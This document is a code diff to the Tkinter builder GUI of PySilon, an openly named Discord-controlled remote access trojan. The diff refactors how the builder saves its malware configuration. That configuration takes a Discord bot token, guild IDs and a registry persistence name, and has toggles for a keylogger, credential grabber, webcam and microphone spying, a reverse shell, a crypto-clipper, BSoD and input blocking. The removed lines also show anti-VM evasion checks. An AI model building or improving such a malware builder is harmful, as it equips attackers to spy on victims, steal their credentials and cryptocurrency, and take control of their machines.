@@ -26,7 +26,7 @@ class Builder:
 
         self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
         self.canvas.place(x=0,y=40,width=700,height=460)
-        self.transparent_background = tk.PhotoImage(width=1, height=1)
+        self.current_window = 0
 
         self.malware_configuration = {
             'token': '',
@@ -149,8 +149,6 @@ class Builder:
 
         self.canvas.create_text(version_indicator[2], version_indicator[3], text=version_indicator[0], fill=version_indicator[1], font=('Consolas', 10), anchor=tk.NE)
 
-
-
     def create_navigation(self):
         self.button_frame = tk.Frame(self.master)
         self.button_frame.place(x=0, y=0, width=700, height=40)
@@ -198,54 +196,41 @@ class Builder:
         horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
         horizontal_separator.place(x=455, y=39, height=1, width=245)
     
-    def save_configuration(self, temporary=True, close=False):
-        try:
-            self.malware_configuration['token'] = self.token_entry.get()
-            self.malware_configuration['guild_ids'] = self.guildids_entry.get()
-            self.malware_configuration['registry_name'] = self.registry_entry.get()
-            self.malware_configuration['directory_name'] = self.directory_entry.get()
-            self.malware_configuration['executable_name'] = self.executable_entry.get()
-            self.malware_configuration['implode_secret'] = self.implode_entry.get()
-        except: pass
-        try:
-            self.malware_configuration['functionalities'] = {
-                'keylogr': self.cbvar_keylogr.get(),
-                'scrnsht': self.cbvar_scrnsht.get(),
-                #'regstry': self.cbvar_regstry.get(),
-                'f_manag': self.cbvar_fmanag.get(),
-                'grabber': self.cbvar_grabber.get(),
-                'mc_live': self.cbvar_mclive.get(),
-                'mc_recc': self.cbvar_mcrecc.get(),
-                'process': self.cbvar_process.get(),
-                'rev_shl': self.cbvar_revshl.get(),
-                'webcam_': self.cbvar_webcam.get(),
-                'scrnrec': self.cbvar_scrnrec.get(),
-                'inputbl': self.cbvar_inputbl.get(),
-                'bluesod': self.cbvar_bluesod.get(),
-                'crclipr': self.cbvar_crclipr.get(),
-                #'forkbmb': self.cbvar_forkbmb.get(),
-                'messger': self.cbvar_messger.get(),
-                'txtspee': self.cbvar_txtspee.get(),
-                'audctrl': self.cbvar_audctrl.get(),
-                'monctrl': self.cbvar_monctrl.get(),
-                'webbloc': self.cbvar_webbloc.get(),
-                'jmpscar': self.cbvar_jmpscar.get(),
-                'keystrk': self.cbvar_keystrk.get(),
-                'scrnman': self.cbvar_scrnman.get()
-            }
-            print(self.malware_configuration['functionalities'])
-        except Exception as error: pass
-        try:
-            self.malware_configuration['anti_vm'] = {
-                'enabled': self.cbvar_antivm.get(),
-                'FilesCheck': self.cbvar_filecheck.get(),
-                'ProcessesCheck': self.cbvar_processcheck.get(),
-                'HardwareIDsCheck': self.cbvar_hwidcheck.get(),
-                'MacAddressesCheck': self.cbvar_maccheck.get()
-            }
-            print('yay')
-        except Exception as error: print(error)
-        print(self.malware_configuration)
+    def save_configuration(self, temporary=True, close=False, configuration=None, from_window=None):
+        match from_window:
+            case 1:
+                self.malware_configuration['token'] = self.token_entry.get()
+                self.malware_configuration['guild_ids'] = self.guildids_entry.get()
+                self.malware_configuration['registry_name'] = self.registry_entry.get()
+                self.malware_configuration['directory_name'] = self.directory_entry.get()
+                self.malware_configuration['executable_name'] = self.executable_entry.get()
+                self.malware_configuration['implode_secret'] = self.implode_entry.get()
+            case 2:
+                self.malware_configuration['functionalities'] = {
+                    'keylogr': self.cbvar_keylogr.get(),
+                    'scrnsht': self.cbvar_scrnsht.get(),
+                    'f_manag': self.cbvar_fmanag.get(),
+                    'grabber': self.cbvar_grabber.get(),
+                    'mc_live': self.cbvar_mclive.get(),
+                    'mc_recc': self.cbvar_mcrecc.get(),
+                    'process': self.cbvar_process.get(),
+                    'rev_shl': self.cbvar_revshl.get(),
+                    'webcam_': self.cbvar_webcam.get(),
+                    'scrnrec': self.cbvar_scrnrec.get(),
+                    'inputbl': self.cbvar_inputbl.get(),
+                    'bluesod': self.cbvar_bluesod.get(),
+                    'crclipr': self.cbvar_crclipr.get(),
+                    'messger': self.cbvar_messger.get(),
+                    'txtspee': self.cbvar_txtspee.get(),
+                    'audctrl': self.cbvar_audctrl.get(),
+                    'monctrl': self.cbvar_monctrl.get(),
+                    'webbloc': self.cbvar_webbloc.get(),
+                    'jmpscar': self.cbvar_jmpscar.get(),
+                    'keystrk': self.cbvar_keystrk.get(),
+                    'scrnman': self.cbvar_scrnman.get()
+                }
+            case 3:
+                pass
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
             configuration_file.write(json.dumps(self.malware_configuration, indent=4))
@@ -305,6 +290,16 @@ class Builder:
 
     def open_pysilon_github(self):
         os.system('start https://github.com/mategol/PySilon-malware/releases')
+    
+    def show_tooltip(self, event, tooltip_text):
+        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
+        self.tooltip_label.place(x=0, y=460, anchor=tk.SW)
+
+    def hide_tooltip(self, event):
+        self.tooltip_label.place_forget()
+
+    def paste_token(self):
+        self.token_entry.insert(0, pyperclip.paste())
 
     def general_settings(self):
         self.general_settings_button['state'] = tk.DISABLED
@@ -313,7 +308,9 @@ class Builder:
         self.functionality_settings_button['relief'] = 'groove'
         self.compiling_settings_button['state'] = tk.NORMAL
         self.compiling_settings_button['relief'] = 'groove'
-        self.save_configuration(True)
+        
+        if self.current_window > 0: self.save_configuration(True, from_window=self.current_window)
+        self.current_window = 1
         self.new_background(1)
         self.load_configuration(True)
 
@@ -371,16 +368,6 @@ class Builder:
         self.implode_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 290, window=self.implode_entry, anchor='w')
 
-    def show_tooltip(self, event, tooltip_text):
-        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
-        self.tooltip_label.place(x=0, y=460, anchor=tk.SW)
-
-    def hide_tooltip(self, event):
-        self.tooltip_label.place_forget()
-
-    def paste_token(self):
-        self.token_entry.insert(0, pyperclip.paste())
-
     def functionality_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
@@ -388,8 +375,10 @@ class Builder:
         self.functionality_settings_button['relief'] = 'flat'
         self.compiling_settings_button['state'] = tk.NORMAL
         self.compiling_settings_button['relief'] = 'groove'
-        self.save_configuration(True)
+        self.save_configuration(True, from_window=self.current_window)
+        self.current_window = 2
         self.new_background(2)
+        self.load_configuration(True)
 
         x_start, y_start, x_delta, y_delta = 50, 50, 8, 35
 
@@ -400,7 +389,7 @@ class Builder:
             text='keylogger',
             font=('Consolas', 12),
             variable=self.cbvar_keylogr,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -416,7 +405,7 @@ class Builder:
             text='take screenshots',
             font=('Consolas', 12),
             variable=self.cbvar_scrnsht,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -432,7 +421,7 @@ class Builder:
             text='file management',
             font=('Consolas', 12),
             variable=self.cbvar_fmanag,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -448,7 +437,7 @@ class Builder:
             text='grabber',
             font=('Consolas', 12),
             variable=self.cbvar_grabber,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -464,7 +453,7 @@ class Builder:
             text='stream live microphone',
             font=('Consolas', 12),
             variable=self.cbvar_mclive,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -480,7 +469,7 @@ class Builder:
             text='24/7 microphone recording',
             font=('Consolas', 12),
             variable=self.cbvar_mcrecc,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -496,7 +485,7 @@ class Builder:
             text='manage processes',
             font=('Consolas', 12),
             variable=self.cbvar_process,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -512,7 +501,7 @@ class Builder:
             text='reverse shell',
             font=('Consolas', 12),
             variable=self.cbvar_revshl,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -528,7 +517,7 @@ class Builder:
             text='webcam handling',
             font=('Consolas', 12),
             variable=self.cbvar_webcam,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -544,7 +533,7 @@ class Builder:
             text='screen recording',
             font=('Consolas', 12),
             variable=self.cbvar_scrnrec,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -560,7 +549,7 @@ class Builder:
             text='input blocking',
             font=('Consolas', 12),
             variable=self.cbvar_inputbl,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -576,7 +565,7 @@ class Builder:
             text='crypto-clipper',
             font=('Consolas', 12),
             variable=self.cbvar_crclipr,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -592,7 +581,7 @@ class Builder:
             text='messager',
             font=('Consolas', 12),
             variable=self.cbvar_messger,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -608,7 +597,7 @@ class Builder:
             text='Text-to-Speech',
             font=('Consolas', 12),
             variable=self.cbvar_txtspee,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -624,7 +613,7 @@ class Builder:
             text='audio controlling',
             font=('Consolas', 12),
             variable=self.cbvar_audctrl,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -640,7 +629,7 @@ class Builder:
             text='monitors controlling',
             font=('Consolas', 12),
             variable=self.cbvar_monctrl,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -656,7 +645,7 @@ class Builder:
             text='website blocking',
             font=('Consolas', 12),
             variable=self.cbvar_webbloc,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -672,7 +661,7 @@ class Builder:
             text='jumpscare',
             font=('Consolas', 12),
             variable=self.cbvar_jmpscar,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -688,7 +677,7 @@ class Builder:
             text='keystroke type',
             font=('Consolas', 12),
             variable=self.cbvar_keystrk,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -704,7 +693,7 @@ class Builder:
             text='screen manipulation',
             font=('Consolas', 12),
             variable=self.cbvar_scrnman,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -720,7 +709,7 @@ class Builder:
             text='BSoD',
             font=('Consolas', 12),
             variable=self.cbvar_bluesod,
-            command=self.save_configuration,
+            
             onvalue=True,
             offvalue=False
         )
@@ -736,6 +725,8 @@ class Builder:
         self.functionality_settings_button['relief'] = 'groove'
         self.compiling_settings_button['state'] = tk.DISABLED
         self.compiling_settings_button['relief'] = 'flat'
+        self.save_configuration(True, from_window=self.current_window)
+        self.current_window = 3
         self.new_background(3)
 
         self.time_check = time.time()
